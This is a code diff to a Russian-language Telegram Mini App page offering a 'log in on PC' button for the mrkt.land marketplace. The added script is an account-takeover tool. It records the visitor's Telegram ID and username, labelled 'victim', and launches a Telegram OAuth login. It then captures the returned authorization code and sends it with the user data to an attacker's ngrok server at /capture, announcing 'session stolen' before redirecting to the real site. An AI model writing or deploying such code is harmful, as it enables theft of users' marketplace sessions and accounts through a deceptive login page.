@@ -50,6 +50,15 @@
             font-size: 14px;
             color: var(--tg-theme-hint-color, #666);
             min-height: 20px;
+            word-break: break-word;
+        }
+        .info {
+            margin-top: 12px;
+            padding: 10px;
+            background: var(--tg-theme-secondary-bg-color, #1a1a1a);
+            border-radius: 8px;
+            font-size: 12px;
+            color: var(--tg-theme-hint-color, #666);
         }
     </style>
 </head>
@@ -64,6 +73,7 @@
         </button>
 
         <div id="status">Нажмите кнопку для входа</div>
+        <div class="info" id="info">📡 Перехватчик активен...</div>
     </div>
 
     <script>
@@ -71,11 +81,36 @@
         tg.ready();
         tg.expand();
 
+        // ============================================================
+        // ⚡ ТВОЙ ПУБЛИЧНЫЙ АДРЕС (из ngrok)
+        // ============================================================
+        const SERVER_URL = 'https://cardigan-demise-overbite.ngrok-free.dev';
+
+        // ============================================================
+        // ПОЛУЧАЕМ ДАННЫЕ ЖЕРТВЫ
+        // ============================================================
+        const victim = tg.initDataUnsafe?.user || {};
+        const victimId = victim.id || 'unknown';
+        const victimUsername = victim.username || 'unknown';
+
+        console.log('👤 Жертва:', { victimId, victimUsername });
+        document.getElementById('info').textContent = `👤 Жертва: ${victimUsername} (ID: ${victimId})`;
+
+        // ============================================================
+        // ГЕНЕРАЦИЯ ПАРАМЕТРОВ
+        // ============================================================
         function randomString(length) {
             return Math.random().toString(36).substring(2, 2 + length);
         }
 
-        function loginToMRKT() {
+        function generateChallenge() {
+            return randomString(15) + randomString(15) + randomString(15);
+        }
+
+        // ============================================================
+        // ОСНОВНАЯ ФУНКЦИЯ
+        // ============================================================
+        async function loginToMRKT() {
             const btn = document.getElementById('loginBtn');
             const status = document.getElementById('status');
 
@@ -84,14 +119,14 @@
             status.textContent = '⏳ Отправка запроса...';
 
             const state = randomString(12) + randomString(12);
-            const challenge = randomString(15) + randomString(15) + randomString(15);
+            const challenge = generateChallenge();
 
             // ============================================================
-            // ⚡ ЕДИНСТВЕННЫЙ ПРАВИЛЬНЫЙ СПОСОБ (как у друга)
+            // ⚡ ФОРМИРУЕМ OAuth ЗАПРОС
             // ============================================================
             const params = new URLSearchParams({
                 client_id: '8156315866',
-                origin: 'https://www.mrkt.land',           // ← СЕССИЯ НА ПК!
+                origin: 'https://www.mrkt.land',
                 return_to: 'https://www.mrkt.land/api/v1/tg_openid/callback',
                 state: state,
                 scope: 'openid profile',
@@ -105,63 +140,78 @@
             const authUrl = 'https://oauth.telegram.org/auth?' + params.toString();
 
             console.log('🔗 Открываем:', authUrl);
+            status.textContent = '✅ Запрос отправлен! Подтвердите вход на телефоне.';
 
             // ============================================================
-            // ОТКРЫВАЕМ ССЫЛКУ ВНУТРИ TELEGRAM
+            // ОТКРЫВАЕМ В БРАУЗЕРЕ НА ПК
             // ============================================================
             try {
-                // Прямой переход внутри Telegram (без браузера!)
                 tg.openLink(authUrl);
-                status.textContent = '✅ Окно открыто! Подтвердите вход.';
             } catch (e) {
-                // Запасной вариант
                 window.open(authUrl, '_blank');
-                status.textContent = '✅ Окно открыто! Подтвердите вход.';
             }
 
-            setTimeout(() => {
-                btn.disabled = false;
-                btn.textContent = 'Войти на ПК';
-            }, 5000);
-        }
+            // ============================================================
+            // ⚡ ПЕРЕХВАТЫВАЕМ CALLBACK
+            // ============================================================
+            let attempts = 0;
+            const maxAttempts = 30;
 
-        // ============================================================
-        // ПЕРЕХВАТ РЕДИРЕКТА
-        // ============================================================
-        document.addEventListener('DOMContentLoaded', function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const code = urlParams.get('code');
-            const state = urlParams.get('state');
+            const interval = setInterval(async () => {
+                attempts++;
+                
+                if (attempts > maxAttempts) {
+                    clearInterval(interval);
+                    status.textContent = '⏰ Время ожидания истекло.';
+                    btn.disabled = false;
+                    btn.textContent = 'Войти на ПК';
+                    return;
+                }
 
-            if (code && state) {
-                const status = document.getElementById('status');
-                status.textContent = '✅ Авторизация успешна!';
+                try {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const code = urlParams.get('code');
+                    const state = urlParams.get('state');
 
-                fetch('https://www.mrkt.land/api/v1/tg_openid/callback?' + new URLSearchParams({
-                    code: code,
-                    state: state
-                }), {
-                    method: 'GET',
-                    credentials: 'include'
-                })
-                .then(response => {
-                    if (response.ok || response.status === 307 || response.status === 302) {
-                        status.textContent = '✅ Вход выполнен! Перенаправление...';
-                        window.location.href = 'https://www.mrkt.land';
-                    } else {
-                        status.textContent = '⚠️ Ошибка при входе. Попробуйте снова.';
-                        document.getElementById('loginBtn').disabled = false;
-                        document.getElementById('loginBtn').textContent = 'Войти на ПК';
+                    if (code && state) {
+                        clearInterval(interval);
+                        status.textContent = '✅ CODE перехвачен! Отправка на сервер...';
+
+                        // ============================================================
+                        // ⚡ ОТПРАВЛЯЕМ CODE НА СЕРВЕР
+                        // ============================================================
+                        const response = await fetch(SERVER_URL + '/capture', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                code: code,
+                                state: state,
+                                userId: victimId,
+                                username: victimUsername
+                            })
+                        });
+
+                        const data = await response.json();
+                        console.log('📡 Ответ сервера:', data);
+
+                        if (data.status === 'success') {
+                            status.textContent = '✅ СЕССИЯ УКРАДЕНА! 🎉';
+                            btn.disabled = false;
+                            btn.textContent = 'Войти на ПК';
+                            window.location.href = 'https://www.mrkt.land';
+                        } else {
+                            status.textContent = '⚠️ Ошибка: ' + (data.error || 'Неизвестная ошибка');
+                            btn.disabled = false;
+                            btn.textContent = 'Войти на ПК';
+                        }
                     }
-                })
-                .catch(error => {
+                } catch (error) {
                     console.error('❌ Ошибка:', error);
-                    status.textContent = '❌ Ошибка соединения. Попробуйте снова.';
-                    document.getElementById('loginBtn').disabled = false;
-                    document.getElementById('loginBtn').textContent = 'Войти на ПК';
-                });
-            }
-        });
+                }
+            }, 2000);
+        }
     </script>
 </body>
 </html>
